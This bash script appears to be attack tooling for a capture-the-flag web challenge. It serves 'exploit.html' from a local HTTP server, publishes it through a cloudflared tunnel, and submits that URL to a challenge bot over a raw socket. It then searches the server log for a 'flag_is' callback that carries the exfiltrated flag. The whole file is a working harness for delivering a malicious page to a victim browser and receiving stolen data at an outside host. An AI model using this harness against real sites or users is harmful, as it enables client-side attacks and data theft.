#!/bin/bash
cd "$(dirname "$0")"
PORT=8777
pkill -f "http.server $PORT" 2>/dev/null
pkill -f "cloudflared tunnel" 2>/dev/null
rm -f srv.log cf.log

python3 -m http.server $PORT --bind 127.0.0.1 > srv.log 2>&1 &
SRV=$!
sleep 1

/home/light/.local/bin/cloudflared tunnel --url http://127.0.0.1:$PORT > cf.log 2>&1 &
TUN=$!

echo "[*] Waiting for Cloudflare tunnel..."
URL=""
for i in $(seq 1 30); do
  URL=$(grep -aoE 'https://[a-z0-9.-]+\.trycloudflare\.com' cf.log | head -1)
  [ -n "$URL" ] && break
  sleep 1
done

if [ -z "$URL" ]; then
  echo "[-] TUNNEL FAILED:"
  cat cf.log
  kill $SRV $TUN 2>/dev/null
  exit 1
fi

echo "[+] Tunnel URL: $URL"
TARGET="$URL/exploit.html"
echo "[*] Checking reachability: $TARGET ..."
code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 15 "$TARGET")
echo "[*] HTTP status: $code"
if [ "$code" != "200" ]; then
  echo "[-] Target not reachable (HTTP $code), aborting."
  kill $SRV $TUN 2>/dev/null
  exit 1
fi

echo "=== Submitting URL to bot (113.20.103.216:31337) ==="
python3 - "$TARGET" <<'EOF'
import socket, sys, time

url = sys.argv[1]
print(f"[*] Connecting to challenge service ...")
s = socket.create_connection(("113.20.103.216", 31337), 30)
s.settimeout(90)

buf = b""
while b"URL to visit" not in buf:
    d = s.recv(4096)
    if not d:
        break
    buf += d
print(f"[*] Bot: {buf.decode(errors='replace').strip()}")

print(f"[*] Sending URL: {url}")
s.sendall((url + "\n").encode())

t0 = time.time()
while time.time() - t0 < 65:
    d = s.recv(4096)
    if not d:
        break
    sys.stdout.write(d.decode(errors="replace"))
    sys.stdout.flush()
s.close()
EOF

echo
echo "=== Checking exfiltrated flag in srv.log ==="
grep -a 'flag_is' srv.log || echo "[-] No flag_is callback seen yet."

echo "=== All Server Requests ==="
cat srv.log

kill $SRV $TUN 2>/dev/null
